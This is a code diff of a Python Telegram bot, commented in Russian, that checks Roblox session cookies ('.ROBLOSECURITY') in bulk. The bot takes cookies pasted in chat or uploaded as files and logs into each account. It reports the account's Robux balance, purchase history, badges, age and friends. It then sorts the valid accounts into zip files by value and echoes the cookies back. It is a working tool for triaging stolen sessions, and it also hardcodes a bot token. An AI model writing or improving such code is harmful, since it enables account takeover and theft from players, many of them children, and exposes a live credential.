@@ -13,12 +13,20 @@ from collections import defaultdict
 TOKEN = '8526516729:AAHxx09k48kWRk0U7q2AcFSCmEdg3TDcfEw'
 bot = telebot.TeleBot(TOKEN)
 
-app = Flask('')
-@app.route('/')
-def home(): return "Бот активен"
+app = Flask(__name__)
 
-def run(): app.run(host='0.0.0.0', port=8080)
-def keep_alive(): Thread(target=run).start()
+@app.route('/')
+def home():
+    return "Бот активен и работает!"
+
+@app.route('/health')
+def health():
+    return "OK", 200
+
+def run():
+    # Render автоматически устанавливает переменную окружения PORT
+    port = int(os.environ.get("PORT", 8080))
+    app.run(host='0.0.0.0', port=port)
 
 # Дорогие лимиты для проверки
 EXPENSIVE_LIMITEDS = {
@@ -44,268 +52,196 @@ def extract_cookie(text):
     match = re.search(r"(_\|WARNING:-DO-NOT-SHARE-THIS\..+)", text)
     return match.group(1).strip() if match else None
 
-def get_extra_info(u_id, cookies):
-    """Получение расширенной информации об аккаунте"""
+def get_extra_info(u_id):
     try:
         u_data = requests.get(f"https://users.roblox.com/v1/users/{u_id}").json()
         reg_dt = datetime.strptime(u_data['created'], "%Y-%m-%dT%H:%M:%S.%fZ")
         days = (datetime.now() - reg_dt).days
         premium = "Да ✅" if u_data.get('hasPremium', False) else "Нет ❌"
-        
-        # Друзья
         f_data = requests.get(f"https://friends.roblox.com/v1/users/{u_id}/friends/count").json()
-        
-        # Почта (приблизительная проверка через настройки)
-        email_verified = "Неизвестно"
-        try:
-            settings = requests.get(f"https://accountsettings.roblox.com/v1/email", cookies=cookies).json()
-            email_verified = "Да ✅" if settings.get('verified', False) else "Нет ❌"
-        except:
-            pass
-        
-        # Регион (по IP)
-        region = "Неизвестно"
-        try:
-            ip_data = requests.get(f"https://www.roblox.com/game/GetCurrentUser.ashx", cookies=cookies).text
-            # Парсинг или использование внешнего API для определения региона
-        except:
-            pass
-        
-        return {
-            'reg_date': reg_dt.strftime("%d.%m.%Y"),
-            'age_days': days,
-            'premium': premium,
-            'friends': f_data.get('count', 0),
-            'email': email_verified,
-            'region': region
-        }
-    except:
-        return {'reg_date': "??", 'age_days': 0, 'premium': "??", 'friends': 0, 'email': "??", 'region': "??"}
+        return reg_dt.strftime("%d.%m.%Y"), days, premium, f_data.get('count', 0)
+    except: 
+        return "??", 0, "??", 0
 
-def get_playtime_data(u_id, cookies):
-    """Получение времени в играх (через API Badges)"""
+def get_created_places(u_id):
     try:
-        url = f"https://badges.roblox.com/v1/users/{u_id}/badges?limit=100"
-        res = requests.get(url, cookies=cookies, timeout=10).json()
-        
-        playtime_per_game = defaultdict(int)  # universe_id: minutes
-        total_playtime = 0
-        
-        for badge in res.get('data', []):
-            if 'awardedDate' in badge and 'createdDate' in badge:
-                awarded = datetime.strptime(badge['awardedDate'], "%Y-%m-%dT%H:%M:%S.%fZ")
-                created = datetime.strptime(badge['createdDate'], "%Y-%m-%dT%H:%M:%S.%fZ")
-                minutes = (awarded - created).total_seconds() / 60
-                universe_id = badge.get('universeId')
-                if universe_id and minutes > 0:
-                    playtime_per_game[universe_id] += minutes
-                    total_playtime += minutes
-        
-        # Конвертация в читаемый формат
-        playtime_readable = {}
-        for universe_id, minutes in playtime_per_game.items():
-            hours = minutes / 60
-            playtime_readable[universe_id] = f"{hours:.1f}ч"
-        
-        return {
-            'total_playtime_hours': total_playtime / 60,
-            'playtime_per_game': playtime_readable
-        }
-    except:
-        return {'total_playtime_hours': 0, 'playtime_per_game': {}}
+        url = f"https://games.roblox.com/v2/users/{u_id}/games?accessFilter=Public&limit=10&sortOrder=Desc"
+        res = requests.get(url, timeout=5).json()
+        games = [g['name'] for g in res.get('data', [])]
+        return games
+    except: 
+        return []
 
-def get_detailed_spending(u_id, cookies):
-    """Детализированная статистика донатов"""
+def get_game_badges(u_id, universe_id, cookies):
     try:
-        url = f"https://economy.roblox.com/v2/users/{u_id}/transactions?transactionType=Purchase&limit=100"
-        all_transactions = []
-        
-        while url:
-            res = requests.get(url, cookies=cookies, timeout=10).json()
-            all_transactions.extend(res.get('data', []))
-            next_cursor = res.get('nextPageCursor')
-            url = f"https://economy.roblox.com/v2/users/{u_id}/transactions?transactionType=Purchase&limit=100&cursor={next_cursor}" if next_cursor else None
-        
-        # Анализ по времени
-        total_spent_all_time = 0
-        spent_last_year = 0
-        spent_per_game = defaultdict(int)
-        
-        one_year_ago = datetime.now() - timedelta(days=365)
-        
-        for transaction in all_transactions:
-            amount = abs(transaction.get('currency', {}).get('amount', 0))
-            created = datetime.strptime(transaction['created'], "%Y-%m-%dT%H:%M:%S.%fZ")
-            
-            total_spent_all_time += amount
-            
-            if created >= one_year_ago:
-                spent_last_year += amount
-            
-            # Разбивка по играм
-            universe_id = transaction.get('details', {}).get('universeId')
-            if universe_id:
-                game_name = get_game_name(universe_id, cookies)
-                spent_per_game[game_name] += amount
-        
-        return {
-            'total_spent_all_time': total_spent_all_time,
-            'spent_last_year': spent_last_year,
-            'spent_per_game': dict(spent_per_game)
-        }
-    except:
-        return {'total_spent_all_time': 0, 'spent_last_year': 0, 'spent_per_game': {}}
-
-def get_inventory_value(u_id, cookies):
-    """Получение RAP и проверка дорогих лимитов"""
-    try:
-        # Получение инвентаря
-        url = f"https://inventory.roblox.com/v2/users/{u_id}/inventory?assetTypes=Collectibles&limit=100"
-        res = requests.get(url, cookies=cookies, timeout=10).json()
-        
-        total_rap = 0
-        expensive_items = []
-        
-        for item in res.get('data', []):
-            asset_id = item.get('assetId')
-            # Проверка на дорогие лимиты
-            if asset_id in EXPENSIVE_LIMITEDS:
-                expensive_items.append(EXPENSIVE_LIMITEDS[asset_id])
-            
-            # Получение RAP
-            try:
-                rap_url = f"https://economy.roblox.com/v1/assets/{asset_id}/resale-data"
-                rap_data = requests.get(rap_url, cookies=cookies, timeout=5).json()
-                total_rap += rap_data.get('price', 0)
-            except:
-                pass
-        
-        return {
-            'total_rap': total_rap,
-            'expensive_items': expensive_items,
-            'has_korblox': any("Korblox" in item for item in expensive_items)
-        }
-    except:
-        return {'total_rap': 0, 'expensive_items': [], 'has_korblox': False}
-
-def get_game_name(universe_id, cookies):
-    """Получение названия игры по universe_id"""
-    try:
-        url = f"https://games.roblox.com/v1/games?universeIds={universe_id}"
-        res = requests.get(url, cookies=cookies, timeout=5).json()
-        return res['data'][0]['name'] if res.get('data') else f"Universe_{universe_id}"
-    except:
-        return f"Universe_{universe_id}"
+        url = f"https://badges.roblox.com/v1/users/{u_id}/universes/{universe_id}/badges?limit=3"
+        res = requests.get(url, cookies=cookies, timeout=3).json()
+        badges = [b['name'] for b in res.get('data', [])]
+        return " (🏆: " + ", ".join(badges) + ")" if badges else ""
+    except: 
+        return ""
 
 def check_cookie(raw_text):
-    """Основная функция проверки куки с расширенными данными"""
     cookie = extract_cookie(raw_text)
-    if not cookie:
+    if not cookie: 
         return {"status": "error"}
     
     cookies = {".ROBLOSECURITY": cookie}
-    
     try:
-        # Базовая информация
         u_req = requests.get("https://users.roblox.com/v1/users/authenticated", cookies=cookies, timeout=10)
-        if u_req.status_code != 200:
+        if u_req.status_code != 200: 
             return {"status": "error"}
         
         u = u_req.json()
         u_id, u_name = u['id'], u['name']
+        reg_date, age_days, premium, friends = get_extra_info(u_id)
+        robux = requests.get(f"https://economy.roblox.com/v1/users/{u_id}/currency", cookies=cookies).json().get('robux', 0)
+        created_list = get_created_places(u_id)
         
-        # Расширенная информация
-        extra_info = get_extra_info(u_id, cookies)
-        
-        # Баланс
-        robux_data = requests.get(f"https://economy.roblox.com/v1/users/{u_id}/currency", cookies=cookies).json()
-        robux = robux_data.get('robux', 0)
-        
-        # Созданные игры
-        created_games = get_created_places(u_id)
-        
-        # Время в играх
-        playtime_data = get_playtime_data(u_id, cookies)
-        
-        # Детализированные донаты
-        spending_data = get_detailed_spending(u_id, cookies)
-        
-        # RAP и лимиты
-        inventory_data = get_inventory_value(u_id, cookies)
+        sales = requests.get(f"https://economy.roblox.com/v2/users/{u_id}/transactions?transactionType=Purchase&limit=50", cookies=cookies).json()
+        spent_per_game = {}
+        total_spent = 0
+        if 'data' in sales:
+            for item in sales['data']:
+                amount = abs(item.get('currency', {}).get('amount', 0))
+                creator = item.get('agent', {}).get('name', 'Unknown')
+                if creator in GAME_DATA:
+                    g_name = GAME_DATA[creator]["name"]
+                    if g_name not in spent_per_game:
+                        badges = get_game_badges(u_id, GAME_DATA[creator]["universe_id"], cookies)
+                        spent_per_game[g_name] = {"sum": 0, "badges": badges}
+                    spent_per_game[g_name]["sum"] += amount
+                    total_spent += amount
+
+        details_text = "".join([f" • {n}: {d['sum']} R$ {d['badges']}\n" for n, d in spent_per_game.items()])
         
         return {
-            "status": "ok",
-            "name": u_name,
-            "id": u_id,
-            "robux": robux,
-            **extra_info,
-            "created_games": created_games,
-            **playtime_data,
-            **spending_data,
-            **inventory_data,
+            "status": "ok", 
+            "name": u_name, 
+            "id": u_id, 
+            "robux": robux, 
+            "age": age_days,
+            "reg_date": reg_date, 
+            "premium": premium, 
+            "friends": friends,
+            "created_games": created_list, 
+            "details": details_text or "Трат нет\n", 
+            "spent": total_spent, 
+            "spent_dict": spent_per_game, 
             "cookie": cookie
         }
     except Exception as e:
-        print(f"Error in check_cookie: {e}")
+        print(f"Error checking cookie: {e}")
         return {"status": "error"}
 
 def format_output(res):
-    """Форматирование вывода с расширенными данными"""
-    # Основная информация
     games_str = "\n • " + "\n • ".join(res['created_games']) if res['created_games'] else "Нет созданных игр"
-    
-    # Время в играх
-    playtime_str = f"{res['total_playtime_hours']:.1f} часов"
-    if res['playtime_per_game']:
-        playtime_str += "\nДетали по играм:\n"
-        for game_id, time in list(res['playtime_per_game'].items())[:10]:  # Ограничим вывод
-            playtime_str += f"   • {get_game_name(game_id, {'._ROBLOSECURITY': res['cookie']})}: {time}\n"
-    
-    # Донаты
-    spent_games_str = ""
-    if res['spent_per_game']:
-        for game, amount in sorted(res['spent_per_game'].items(), key=lambda x: x[1], reverse=True)[:10]:
-            spent_games_str += f"   • {game}: {amount} R$\n"
-    
-    # Дорогие лимиты
-    limiteds_str = ", ".join(res['expensive_items']) if res['expensive_items'] else "Нет"
-    
-    output = f"""
-👤 АККАУНТ: {res['name']} (ID: {res['id']})
-🗓 РЕГИСТРАЦИЯ: {res['reg_date']} ({res['age_days']} дн.)
-📍 РЕГИОН: {res['region']}
-📧 ПОЧТА: {res['email']}
-🌟 PREMIUM: {res['premium']}
-👥 ДРУЗЕЙ: {res['friends']}
-💰 БАЛАНС: {res['robux']} R$
-🎮 RAP (стоимость инвентаря): {res['total_rap']} R$
+    return (
+        f"👤 Аккаунт: {res['name']} (ID: {res['id']})\n"
+        f"🗓 Регистрация: {res['reg_date']} ({res['age']} дн.)\n"
+        f"🌟 Premium: {res['premium']} | 👥 Друзья: {res['friends']}\n"
+        f"💰 Баланс: {res['robux']} R$\n\n"
+        f"🛠 СОЗДАННЫЕ ИГРЫ: {games_str}\n\n"
+        f"💸 ТРАТЫ:\n{res['details']}"
+        f"--- Всего по списку: {res['spent']} R$ ---\n\n"
+        f"🍪 КУКИ:\n`{res['cookie']}`\n"
+        f"{'='*30}\n"
+    )
 
-🕐 ВРЕМЯ В ИГРАХ:
-Всего: {playtime_str}
+@bot.message_handler(commands=['start'])
+def start(message):
+    bot.reply_to(message, "👋 Привет! Пришли куки или .txt файл.")
 
-💸 ДОНАТЫ:
-За всё время: {res['total_spent_all_time']} R$
-За последний год: {res['spent_last_year']} R$
-По играм:
-{spent_games_str}
+@bot.message_handler(content_types=['text', 'document'])
+def handle(message):
+    try:
+        if message.content_type == 'text' and len(message.text) > 100:
+            res = check_cookie(message.text)
+            if res['status'] == 'ok': 
+                bot.send_message(message.chat.id, format_output(res), parse_mode="Markdown")
+            else:
+                bot.send_message(message.chat.id, "❌ Неверный формат куки или ошибка запроса")
+        
+        elif message.content_type == 'document':
+            file_info = bot.get_file(message.document.file_id)
+            lines = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore').splitlines()
+            bot.send_message(message.chat.id, f"⌛ Чек {len(lines)} строк...")
+            
+            valid_data = []
+            for l in lines:
+                if l.strip():
+                    res = check_cookie(l)
+                    if res['status'] == 'ok': 
+                        valid_data.append(res)
 
-💎 ДОРОГИЕ ЛИМИТЫ:
-{limiteds_str}
-{'✅ Есть Korblox' if res['has_korblox'] else '❌ Нет Korblox'}
+            if valid_data:
+                # ГЕНЕРАЦИЯ СВОДКИ
+                total_robux = sum(d['robux'] for d in valid_data)
+                best_friends = max(valid_data, key=lambda x: x['friends'])
+                oldest_acc = max(valid_data, key=lambda x: x['age'])
+                best_dev = max(valid_data, key=lambda x: len(x['created_games']))
+                
+                stats = f"📊 СВОДКА ПО ФАЙЛУ ({len(valid_data)} акк.):\n"
+                stats += f"💰 ОБЩИЙ БАНК: **{total_robux} R$**\n"
+                stats += f"👴 OLD ACC: {oldest_acc['name']} ({oldest_acc['age']} дн.)\n"
+                stats += f"👥 ТОП ДРУЗЕЙ: {best_friends['name']} ({best_friends['friends']})\n"
+                stats += f"🛠 ТОП ДЕВЕЛОПЕР: {best_dev['name']} ({len(best_dev['created_games'])} игр)\n\n"
+                
+                stats += "🏆 ТОП ТРАТ ПО ИГРАМ:\n"
+                for g_id, g_info in GAME_DATA.items():
+                    g_name = g_info['name']
+                    max_val, top_s = 0, None
+                    for d in valid_data:
+                        val = d['spent_dict'].get(g_name, {}).get('sum', 0)
+                        if val > max_val: 
+                            max_val, top_s = val, d
+                    if top_s: 
+                        stats += f"🥇 {g_name}: {top_s['name']} — {max_val} R$\n"
 
-🛠 СОЗДАННЫЕ ИГРЫ:
-{games_str}
+                # ЛОГИКА ОТПРАВКИ ФАЙЛОВ
+                if len(valid_data) <= 10:
+                    buf = io.BytesIO("".join([format_output(d) for d in valid_data]).encode('utf-8'))
+                    buf.name = "results.txt"
+                    bot.send_document(message.chat.id, buf)
+                else:
+                    zip_buf = io.BytesIO()
+                    with zipfile.ZipFile(zip_buf, 'w', zipfile.ZIP_DEFLATED) as zip_file:
+                        files = {
+                            "robux.txt": [d for d in valid_data if d['robux'] > 0],
+                            "developers.txt": [d for d in valid_data if len(d['created_games']) > 0],
+                            "donators.txt": [d for d in valid_data if d['spent'] > 0],
+                            "old_accounts.txt": [d for d in valid_data if d['age'] > 365],
+                            "all_valid.txt": valid_data
+                        }
+                        for name, data in files.items():
+                            if data:
+                                content = "".join([format_output(d) for d in data])
+                                zip_file.writestr(name, content)
+                    
+                    zip_buf.seek(0)
+                    zip_buf.name = "checker_results.zip"
+                    bot.send_document(message.chat.id, zip_buf, caption="📦 Результаты разделены по категориям")
 
-🍪 КУКИ:
-`{res['cookie']}`
+                bot.send_message(message.chat.id, stats, parse_mode="Markdown")
+            else:
+                bot.send_message(message.chat.id, "❌ Валид не найден.")
+    except Exception as e: 
+        print(f"Error in handle: {e}")
+        bot.send_message(message.chat.id, f"❌ Ошибка: {str(e)[:200]}")
 
-{'='*40}
-"""
-    return output
-
-# Остальные функции (handle, start и т.д.) остаются без изменений
-# ... (предыдущий код обработки сообщений)
-
+# Запуск бота и веб-сервера
 if __name__ == '__main__':
-    keep_alive()
-    bot.infinity_polling()
+    import os
+    
+    # Запускаем Flask в отдельном потоке
+    from threading import Thread
+    flask_thread = Thread(target=run)
+    flask_thread.daemon = True
+    flask_thread.start()
+    
+    # Запускаем бота
+    print("🤖 Бот запускается...")
+    try:
+        bot.infinity_polling(timeout=60, long_polling_timeout=60)
+    except Exception as e:
+        print(f"Ошибка при запуске бота: {e}")
